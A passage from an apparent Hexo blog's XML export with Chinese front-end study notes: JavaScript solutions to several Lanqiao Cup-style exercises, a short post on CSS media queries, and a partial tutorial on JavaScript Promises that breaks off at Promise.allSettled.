    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="拼接url参数-简单">拼接url参数 (简单)</h3>
<p><img src="a.png" alt=""></p>
<h3 id="对函数参数相关词语进行规则匹配-中等">对函数参数相关词语进行规则匹配 (中等)</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 假设生成的绘画数据数组为 artDataArray</span></span><br><span class="line"><span class="keyword">const</span> artDataArray = [</span><br><span class="line">  &#123; <span class="string">&quot;imageUrl&quot;</span>: <span class="string">&quot;images/img1.jpg&quot;</span>, <span class="string">&quot;tags&quot;</span>: <span class="string">&quot;知更鸟、湖蓝色、十分可爱、皮克斯渲染&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;imageUrl&quot;</span>: <span class="string">&quot;images/img2.jpg&quot;</span>, <span class="string">&quot;tags&quot;</span>: <span class="string">&quot;知更鸟、个性的眉毛、模糊毛皮&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;imageUrl&quot;</span>: <span class="string">&quot;images/img3.jpg&quot;</span>, <span class="string">&quot;tags&quot;</span>: <span class="string">&quot;知更鸟、剪纸风格、个性的眉毛&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;imageUrl&quot;</span>: <span class="string">&quot;images/img4.jpg&quot;</span>, <span class="string">&quot;tags&quot;</span>: <span class="string">&quot;知更鸟、油画、十分可爱、特殊的羽毛&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;imageUrl&quot;</span>: <span class="string">&quot;images/img5.jpg&quot;</span>, <span class="string">&quot;tags&quot;</span>: <span class="string">&quot;男性、卡通、书、桌子&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;imageUrl&quot;</span>: <span class="string">&quot;images/img6.jpg&quot;</span>, <span class="string">&quot;tags&quot;</span>: <span class="string">&quot;男性、卡通、玩具、眼镜&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;imageUrl&quot;</span>: <span class="string">&quot;images/img7.jpg&quot;</span>, <span class="string">&quot;tags&quot;</span>: <span class="string">&quot;男性、卡通、玩具&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;imageUrl&quot;</span>: <span class="string">&quot;images/img8.jpg&quot;</span>, <span class="string">&quot;tags&quot;</span>: <span class="string">&quot;男性、卡通、书&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;imageUrl&quot;</span>: <span class="string">&quot;images/img9.jpg&quot;</span>, <span class="string">&quot;tags&quot;</span>: <span class="string">&quot;沙滩、遮阳伞、散步&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;imageUrl&quot;</span>: <span class="string">&quot;images/img10.jpg&quot;</span>, <span class="string">&quot;tags&quot;</span>: <span class="string">&quot;沙滩、椰子树、一群人&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;imageUrl&quot;</span>: <span class="string">&quot;images/img11.jpg&quot;</span>, <span class="string">&quot;tags&quot;</span>: <span class="string">&quot;沙滩、遮阳伞、人、包&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;imageUrl&quot;</span>: <span class="string">&quot;images/img12.jpg&quot;</span>, <span class="string">&quot;tags&quot;</span>: <span class="string">&quot;沙滩、回忆、相框&quot;</span> &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; imageCount 生成的图片数量</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; selectedText 用户输入的文本</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateAndDisplayImages</span>(<span class="params">imageCount, selectedText</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> imgAry = [] <span class="comment">// 定义最佳匹配的图片数组</span></span><br><span class="line">  <span class="comment">// TODO：待补充代码 </span></span><br><span class="line">  <span class="keyword">let</span> arr = []</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; artDataArray.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> keyword = artDataArray[i].<span class="property">tags</span>.<span class="title function_">split</span>(<span class="string">&quot;、&quot;</span>)</span><br><span class="line">    arr[i] = &#123;</span><br><span class="line">      <span class="attr">count</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">data</span>: artDataArray[i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; keyword.<span class="property">length</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(selectedText.<span class="title function_">indexOf</span>(keyword[j]) != -<span class="number">1</span>)</span><br><span class="line">        arr[i].<span class="property">count</span>++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> sortArr = arr.<span class="title function_">sort</span>(<span class="function">(<span class="params">a,b</span>)=&gt;</span> b.<span class="property">count</span> - a.<span class="property">count</span>).<span class="title function_">slice</span>(<span class="number">0</span>,imageCount)</span><br><span class="line">  sortArr.<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> imgAry.<span class="title function_">push</span>(item.<span class="property">data</span>))</span><br><span class="line">  <span class="comment">//TODO：END</span></span><br><span class="line">  <span class="keyword">return</span> imgAry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="简易JSX解析器-中等">简易JSX解析器 (中等)</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> type 要渲染的元素类型，即标签名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> config 包含标签属性或事件函数的对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">jsx</span> = (<span class="params">type, config</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">/* <span class="doctag">TODO:</span> 待补充代码 */</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(type,config);</span><br><span class="line">  <span class="keyword">let</span> dom = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(type)</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(config.<span class="property">children</span>) === <span class="string">&#x27;[object String]&#x27;</span>)&#123;</span><br><span class="line">    dom.<span class="property">innerHTML</span> += config.<span class="property">children</span>  </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; config.<span class="property">children</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(config.<span class="property">children</span>[i]) === <span class="string">&#x27;[object String]&#x27;</span>)&#123;</span><br><span class="line">    dom.<span class="property">innerHTML</span> += config.<span class="property">children</span>[i]</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    dom.<span class="title function_">appendChild</span>(config.<span class="property">children</span>[i])</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(config[<span class="string">&#x27;style&#x27;</span>] !== <span class="literal">undefined</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> styleKeys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(config[<span class="string">&#x27;style&#x27;</span>])</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> styleKeys) &#123;</span><br><span class="line">      dom.<span class="property">style</span>[key] = config[<span class="string">&#x27;style&#x27;</span>][key]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">const</span> configKeys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(config)</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> configKeys) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(config[key]) === <span class="string">&#x27;[object Function]&#x27;</span>)&#123;</span><br><span class="line">      dom[key] = config[key]</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> configKeys) &#123;</span><br><span class="line">  <span class="keyword">if</span>(key !== <span class="string">&#x27;children&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(config[key]) === <span class="string">&#x27;[object String]&#x27;</span>)&#123;</span><br><span class="line">      dom.<span class="title function_">setAttribute</span>(key,config[key])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> dom</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Github-明星项目统计">Github 明星项目统计</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">changeHandle</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">// TODO：待补充代码</span></span><br><span class="line">    <span class="keyword">const</span> arr = []</span><br><span class="line">    <span class="keyword">if</span>(language.<span class="property">value</span> === <span class="string">&#x27;All&#x27;</span>)</span><br><span class="line">        arr.<span class="title function_">push</span>(...chartData.<span class="property">value</span>)</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        arr.<span class="title function_">push</span>(...chartData.<span class="property">value</span></span><br><span class="line">        .<span class="title function_">filter</span>(<span class="function"><span class="params">item</span>=&gt;</span>item.<span class="property">language</span> === language.<span class="property">value</span>)</span><br><span class="line">        .<span class="title function_">sort</span>(<span class="function">(<span class="params">a,b</span>)=&gt;</span>b.<span class="property">stars</span> - a.<span class="property">stars</span>)</span><br><span class="line">        .<span class="title function_">slice</span>(pageStart.<span class="property">value</span>-<span class="number">1</span>,pageEnd.<span class="property">value</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    xData.<span class="property">value</span> = arr.<span class="title function_">map</span>(<span class="function"><span class="params">item</span>=&gt;</span>item.<span class="property">name</span>)</span><br><span class="line">    yData.<span class="property">value</span> = arr.<span class="title function_">map</span>(<span class="function"><span class="params">item</span>=&gt;</span>item.<span class="property">stars</span>)</span><br><span class="line">    <span class="title function_">initChart</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="小蓝驿站">小蓝驿站</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">addContact</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">// TODO：待补充代码 目标 2 </span></span><br><span class="line">    <span class="keyword">const</span> data = contacts.<span class="property">value</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span>=&gt;</span>item.<span class="property">letter</span> === newContact.<span class="property">value</span>[<span class="number">0</span>].<span class="title function_">toUpperCase</span>())</span><br><span class="line">    <span class="keyword">if</span>(data.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">        contacts.<span class="property">value</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">            <span class="attr">contacts</span>:[&#123;<span class="attr">name</span>:newContact.<span class="property">value</span>&#125;],</span><br><span class="line">            <span class="attr">letter</span>:newContact.<span class="property">value</span>[<span class="number">0</span>].<span class="title function_">toUpperCase</span>()</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; contacts.<span class="property">value</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(contacts.<span class="property">value</span>[i].<span class="property">letter</span> === newContact.<span class="property">value</span>[<span class="number">0</span>].<span class="title function_">toUpperCase</span>())&#123;</span><br><span class="line">                contacts.<span class="property">value</span>[i].<span class="property">contacts</span>.<span class="title function_">push</span>(&#123;<span class="attr">name</span>:newContact.<span class="property">value</span>&#125;)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TODO：END</span></span><br><span class="line">    <span class="comment">// 添加完成清空联系人输入框</span></span><br><span class="line">    newContact.<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="搜索重试">搜索重试</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 定义一个重试函数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">func</span>&#125; operation 要作用的函数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">number</span>&#125; maxAttempts 最大重试次数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">number</span>&#125; delayBetweenRetries 重试之间的时间间隔</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">retry</span>(<span class="params">operation, maxAttempts, delayBetweenRetries</span>) &#123;</span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span>待补充代码</span></span><br><span class="line">  <span class="keyword">let</span> attempt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (attempt &lt; maxAttempts) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 尝试执行操作</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">await</span> <span class="title function_">operation</span>(); <span class="comment">// 如果成功，返回结果</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      attempt++; <span class="comment">// 增加尝试次数</span></span><br><span class="line">      <span class="keyword">if</span> (attempt &gt;= maxAttempts) &#123;</span><br><span class="line">        <span class="comment">// return new Promise((res,rej)=&gt;rej(error))</span></span><br><span class="line">        <span class="keyword">throw</span> error</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 如果失败，等待指定的时间再重试</span></span><br><span class="line">      <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, delayBetweenRetries));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="购物狂欢节">购物狂欢节</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchProducts</span>(<span class="params">category</span>) &#123;</span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> 根据分类获取商品数据</span></span><br><span class="line">  products.<span class="property">value</span> = []</span><br><span class="line">  <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`api/products/<span class="subst">$&#123;category&#125;</span>.json`</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">res</span>=&gt;</span>res.<span class="title function_">json</span>())</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    products.<span class="property">value</span>.<span class="title function_">push</span>(data[i])</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> products = <span class="title function_">ref</span>([]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addProduct</span>(<span class="params">product</span>) &#123;</span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> 添加商品到购物车，如果商品已存在，则数量+1</span></span><br><span class="line">  <span class="keyword">if</span>(products.<span class="property">value</span>.<span class="title function_">some</span>(<span class="function">(<span class="params">e</span>)=&gt;</span>e.<span class="property">id</span> === product.<span class="property">id</span>))&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; products.<span class="property">value</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(products.<span class="property">value</span>[i].<span class="property">id</span> === product.<span class="property">id</span>)&#123;</span><br><span class="line">        products.<span class="property">value</span>[i].<span class="property">quantity</span> += <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    product.<span class="property">quantity</span> = <span class="number">1</span></span><br><span class="line">    products.<span class="property">value</span>.<span class="title function_">push</span>(product)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> totalPrice = <span class="title function_">computed</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> 计算总价</span></span><br><span class="line">  <span class="keyword">return</span> products.<span class="property">value</span>.<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc,item</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> acc + item.<span class="property">price</span> * item.<span class="property">quantity</span></span><br><span class="line">  &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>蓝桥杯</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS 媒体查询</title>
    <url>/posts/3106d1e6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="媒体类型（Media-Type）​">媒体类型（Media Type）​</h3>
<h4 id="screen（屏幕）">screen（屏幕）</h4>
<h4 id="print（打印）">print（打印）</h4>
<h4 id="all（全部设备）">all（全部设备）</h4>
<h3 id="​媒体特性条件（Media-Feature）">​媒体特性条件（Media Feature）</h3>
<p>必须用括号包裹，如 (min-width: 900px)</p>
<h3 id="基本语法">基本语法</h3>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> 媒体类型 <span class="keyword">and</span> (媒体特性条件) &#123;</span><br><span class="line">  <span class="comment">/* 样式规则 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="示例">示例</h3>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 单条件 */</span></span><br><span class="line"><span class="comment">/* 屏幕设备且宽度≥900px 时生效 */</span></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">900px</span>) &#123;</span><br><span class="line">  <span class="selector-tag">article</span> &#123; <span class="attribute">padding</span>: <span class="number">1rem</span> <span class="number">3rem</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 多条件 */</span></span><br><span class="line"><span class="comment">/* 屏幕设备、宽度≥900px 且横屏时生效 */</span></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">900px</span>) <span class="keyword">and</span> (<span class="attribute">orientation</span>: landscape) &#123;</span><br><span class="line">  <span class="selector-tag">article</span> &#123; <span class="attribute">padding</span>: <span class="number">2rem</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 等效于 @media all and (min-width: 900px) */</span></span><br><span class="line"><span class="keyword">@media</span> (<span class="attribute">min-width</span>: <span class="number">900px</span>) &#123;</span><br><span class="line">  <span class="selector-tag">article</span> &#123; <span class="attribute">padding</span>: <span class="number">1rem</span> <span class="number">3rem</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用 ,（逗号）表示 ​逻辑或（OR） */</span></span><br><span class="line"><span class="comment">/* 屏幕设备且宽度≥900px，或打印设备时生效 */</span></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">900px</span>), print &#123;</span><br><span class="line">  <span class="selector-tag">article</span> &#123; <span class="attribute">padding</span>: <span class="number">1rem</span> <span class="number">3rem</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>CSS</tag>
        <tag>媒体查询</tag>
        <tag>media</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript Promise 的使用</title>
    <url>/posts/da4c0519/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Promise-的概念">Promise 的概念</h2>
<p>一个 <code>Promise</code> 必然处于以下几种状态之一：</p>
<ul>
<li>待定（<code>pending</code>）：初始状态，既没有被兑现，也没有被拒绝。</li>
<li>已兑现（<code>fulfilled</code>）：意味着操作成功完成。可以用then方法来处理。</li>
<li>已拒绝（<code>rejected</code>）：意味着操作失败。可以用catch方法来处理<br>
如果一个 <code>Promise</code> 已经被兑现或拒绝，即不再处于待定状态，那么则称之为已敲定（<code>settled</code>）。<br>
<img src="a.png" alt=""></li>
</ul>
<h2 id="Promise-基本使用">Promise 基本使用</h2>
<h3 id="Promise-成功回调">Promise 成功回调</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 模拟异步操作</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="string">&#x27;成功&#x27;</span>);</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="Promise-失败回调">Promise 失败回调</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 模拟异步操作</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(<span class="string">&#x27;失败&#x27;</span>);</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="Promise-then-方法">Promise then 方法</h3>
<p><code>then</code> 方法用于指定当 <code>Promise</code> 对象状态变为已兑现（<code>fulfilled</code>）时，所执行的操作。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 模拟异步操作</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="string">&#x27;成功&#x27;</span>);</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;);</span><br><span class="line">promise.<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="Promise-catch-方法">Promise catch 方法</h3>
<p><code>catch</code> 方法用于指定当 <code>Promise</code> 对象状态变为已拒绝（<code>rejected</code>）时，所执行的操作。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 模拟异步操作</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(<span class="string">&#x27;失败&#x27;</span>);</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;);</span><br><span class="line">promise.<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="Promise-finally-方法">Promise finally 方法</h3>
<p>finally 方法用于指定不管 <code>Promise</code> 对象最后状态如何，都会执行的操作。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 模拟异步操作</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="string">&#x27;成功&#x27;</span>);</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;);</span><br><span class="line">promise.<span class="title function_">finally</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;finally&#x27;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="Promise-并发和静态方法">Promise 并发和静态方法</h2>
<p>Promise 类提供了四个静态方法来促进异步任务的并发：</p>
<p>所有这些方法都接受一个 Promise（确切地说是 thenable）的可迭代对象，并返回一个新的 Promise。它们都支持子类化，这意味着它们可以在 Promise 的子类上调用，结果将是一个属于子类类型的 Promise。为此，子类的构造函数必须实现与 Promise() 构造函数相同的签名——接受一个以 resolve 和 reject 回调函数作为参数的单个 executor 函数。子类还必须有一个 resolve 静态方法，可以像 Promise.resolve() 一样调用，以将值解析为 Promise。</p>
<p>请注意，JavaScript 的本质上是单线程的，因此在任何时刻，只有一个任务会被执行，尽管控制权可以在不同的 Promise 之间切换，从而使 Promise 的执行看起来是并发的。在 JavaScript 中，并行执行只能通过 worker 线程实现。</p>
<h3 id="Promise-all">Promise.all()</h3>
<p>仅在 ​所有传入的 <code>Promise</code> 都变为 <code>fulfilled</code>（成功）​​ 时才会返回结果数组。若其中​任意一个 <code>Promise</code> 变为 <code>rejected</code>（失败）​，则立即以该失败原因拒绝。<br>
示例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当所有 Promise 成功时，返回的数组 ​严格按传入顺序排列结果，与完成先后无关：</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">all</span>([</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">1</span>),</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">2</span>),</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">3</span>)</span><br><span class="line">]).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>); <span class="comment">// 输出 [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 只要有一个 Promise 失败，立即终止并返回 ​首个遇到的错误：</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">all</span>([</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">1</span>),</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;error&#x27;</span>),</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">3</span>) <span class="comment">// 此结果不会被处理</span></span><br><span class="line">]).<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">log</span>); <span class="comment">// 输出 &quot;error&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="Promise-allSettled">Promise.allSettled()</h3>
<p>在所有的 Promise 都被敲定时兑现。<br>
示例:</p>
